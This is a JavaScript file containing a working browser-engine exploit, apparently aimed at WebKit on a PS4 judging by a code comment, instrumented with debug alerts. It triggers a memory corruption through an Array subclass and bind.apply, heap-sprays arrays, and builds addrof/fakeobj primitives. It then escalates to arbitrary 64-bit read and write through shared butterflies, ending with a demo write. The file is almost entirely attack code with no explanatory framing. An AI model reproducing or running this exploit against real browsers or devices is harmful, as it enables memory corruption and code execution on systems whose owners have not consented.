
// safeAlert
function safeAlert() {
    try {
        var parts = [];
        for (var i = 0; i < arguments.length; ++i) {
            try { parts.push(String(arguments[i])); } catch(e) { parts.push('[toString error]'); }
        }
        alert(parts.join(' '));
    } catch (e) {
        try { print(parts.join(' ')); } catch(_) {
            try { console.log(parts.join(' ')); } catch(_) {}
        }
    }
}


if (typeof gc === 'undefined') {
    gc = function() { /* no-op in PS4 if not present */ };
}


safeAlert('DEBUG: SCRIPT START');

try {
    var SPRAY1 = 3000
    var ALLOCS = 10

    var workbuf = new ArrayBuffer(0x1000000)
    var u32_buffer = new Uint32Array(workbuf)
    var u8_buffer = new Uint8Array(workbuf)

    var conversion_buffer = new ArrayBuffer(8)
    var f64 = new Float64Array(conversion_buffer)
    var i32 = new Uint32Array(conversion_buffer)

    var BASE32 = 0x100000000
    function f2i(f) {
        f64[0] = f
        return i32[0] + BASE32 * i32[1]
    }

    function i2f(i) {
        i32[0] = i % BASE32
        i32[1] = i / BASE32
        return f64[0]
    }

    function hex(x) {
        if (x < 0) return `-${hex(-x)}`
        return `0x${x.toString(16)}`
    }

    function fail(x) {
        safeAlert('FAIL ' + x)
        throw null
    }

    class X extends Array {}
    Object.defineProperty(X.prototype,'1337',{})

    function of(args) {
        return new (Function.prototype.bind.apply(X, args))
    }

    safeAlert('phase: build args');
    var obj = {a:42.42}
    var args = []
    for (var i = 0; i < 46; ++i) args.push(obj)

    safeAlert('phase: spray allocate');
    var spray = new Array(SPRAY1)
    for (var i = 0; i < SPRAY1; i += 3) {
        spray[i]   = [13.37,13.37,13.37,13.37,13.37,13.37+i]
        spray[i+1] = [13.37,13.37,13.37,13.37,13.37,13.37+i]
        spray[i+2] = [{},{},{},{},{},{},{}]
    }

    var start = Math.floor(SPRAY1 - SPRAY1/3)
    start -= start%3
    for (var i = start; i < SPRAY1; i += 3) spray[i] = null
    safeAlert('after free holes, calling gc');
    try { gc(); } catch(e) { safeAlert('gc() threw: ' + e); }

    safeAlert('phase: trigger of(args)');
    for (var i = 0; i < 10; ++i) {
        try { of(args); } catch(e) { safeAlert('of(args) threw at i=' + i + ' err=' + e); }
    }

    safeAlert('phase: scan for corrupted spray');
    var unboxed1, boxed1, foundIndex = -1
    for (var i = 1; i < SPRAY1; i += 3) {
        try {
            if (spray[i] !== null && spray[i][0] !== 13.37) {
                safeAlert("FOUND corrupted spray at i=" + i + " value=" + String(spray[i][0]) + " -> addrof = " + hex(f2i(spray[i][0])));
                unboxed1 = spray[i]
                boxed1 = spray[i+1]
                foundIndex = i
                break
            }
        } catch(e) {
            safeAlert('Error while scanning i=' + i + ' err=' + e);
        }
    }
    if (foundIndex === -1) {
        safeAlert('No corrupted spray found! Aborting early for debug.');
        throw 'no-spray-corrupt';
    }

    safeAlert('phase: build stage1 primitives');
    var stage1 = {
        addrof: function(x) {
            boxed1[0] = x
            return f2i(unboxed1[8])
        },
        fakeobj: function(x) {
            unboxed1[8] = i2f(x)
            return boxed1[0]
        },
        test: function() {
            var addr = this.addrof({a: 0x1337})
            var x = this.fakeobj(addr)
            if (x.a != 0x1337) fail(1)
        },
    }

    try {
        stage1.test()
        safeAlert('stage1.test PASSED');
    } catch (e) {
        safeAlert('stage1.test FAILED: ' + e)
        throw e
    }

    // rest of exploit...
    safeAlert('phase: structure spray & leak');
    var structure_spray = []
    for (var i = 0; i < 1000; ++i) {
        var ary = {a:1,b:2,c:3,d:4,e:5,f:6,g:0xfffffff}
        ary['prop'+i] = 1
        structure_spray.push(ary)
    }
    var manager = structure_spray[500]
    var leak_addr = stage1.addrof(manager)
    safeAlert('leaking from: ' + hex(leak_addr))

    function alloc_above_manager(expr) {
        var res
        var attempts = 0
        do {
            for (var i = 0; i < ALLOCS; ++i) structure_spray.push(eval(expr))
            res = eval(expr)
            attempts++
            if (attempts % 10 === 0) safeAlert('alloc_above_manager attempts=' + attempts)
        } while (stage1.addrof(res) < leak_addr)
        safeAlert('alloc_above_manager done after ' + attempts + ' rounds')
        return res
    }

    var unboxed_size = 100
    var unboxed = alloc_above_manager('[' + '13.37,'.repeat(unboxed_size) + ']')
    var boxed = alloc_above_manager('[{}]')
    var victim = alloc_above_manager('[]')

    safeAlert('allocated unboxed/boxed/victim');

    victim.p0 = 0x1337
    function victim_write(val) { victim.p0 = val }
    function victim_read() { return victim.p0 }

    for (var i = 0; i < 100000; ++i) {
        victim_write({});
        victim_write(13.37);
        victim_write([]);
    }
    safeAlert('victim priming done');

    i32[0] = 0x300
    i32[1] = 0x01082007 - 0x10000
    var outer = { p1: f64[0], p2: manager, p3: 0xfffffff }

    safeAlert('outer addr = ' + hex(stage1.addrof(outer)));
    var fake_addr = stage1.addrof(outer) + 0x10
    safeAlert('fake obj @ ' + hex(fake_addr))

    var unboxed_addr = stage1.addrof(unboxed)
    var boxed_addr = stage1.addrof(boxed)
    var victim_addr = stage1.addrof(victim)
    safeAlert('leak ' + hex(leak_addr) + '\nunboxed ' + hex(unboxed_addr) + '\nboxed ' + hex(boxed_addr) + '\nvictim ' + hex(victim_addr))

    var holder = {fake: {}}
    holder.fake = stage1.fakeobj(fake_addr)

    // Share a butterfly
    var shared_butterfly = f2i(holder.fake[(unboxed_addr + 8 - leak_addr) / 8])
    safeAlert('unboxed butterfly = ' + hex(shared_butterfly))
    var boxed_butterfly = holder.fake[(boxed_addr + 8 - leak_addr) / 8]
    safeAlert('boxed butterfly = ' + hex(f2i(boxed_butterfly)))
    holder.fake[(boxed_addr + 8 - leak_addr) / 8] = i2f(shared_butterfly)

    var victim_butterfly = holder.fake[(victim_addr + 8 - leak_addr) / 8]
    function set_victim_addr(where) { holder.fake[(victim_addr + 8 - leak_addr) / 8] = i2f(where + 0x10) }
    function reset_victim_addr() { holder.fake[(victim_addr + 8 - leak_addr) / 8] = victim_butterfly }

    var stage2 = {
        addrof: function(victim) { return stage1.addrof(victim) },
        fakeobj: function(addr) { return stage1.fakeobj(addr) },
        write64: function(where, what) {
            set_victim_addr(where)
            safeAlert('write64 where=' + hex(where) + ' what=' + hex(what))
            victim_write(this.fakeobj(what))
            reset_victim_addr()
        },
        read64: function(where) {
            set_victim_addr(where)
            var res = this.addrof(victim_read())
            reset_victim_addr()
            return res
        },
        test: function() {
            var addr = this.addrof({a: 0x1337})
            var x = this.fakeobj(addr)
            if (x.a != 0x1337) fail(2)
            this.addrof({a: 0x1338})
            x = this.fakeobj(addr)
            if (x.a != 0x1337) fail(3)
            var obj = {a:1}
            var obj_addr = this.addrof(obj)
            this.write64(obj_addr + 0x10, 0x1337)
            if (0x1337 != this.read64(obj_addr + 0x10)) fail(4)
        }
    }

    try {
        stage2.test()
        safeAlert('stage2.test PASSED');
    } catch (e) {
        safeAlert('stage2.test FAILED: ' + e)
        throw e
    }

    // final demo write (may crash if address invalid)
    try {
        stage2.write64(0x4141414140, 0x4242424240)
        safeAlert('final write attempted');
    } catch (e) {
        safeAlert('final write threw: ' + e);
    }

    safeAlert('DEBUG: SCRIPT END');
} catch (e) {
    safeAlert('TOP-LEVEL EXCEPTION: ' + String(e));
}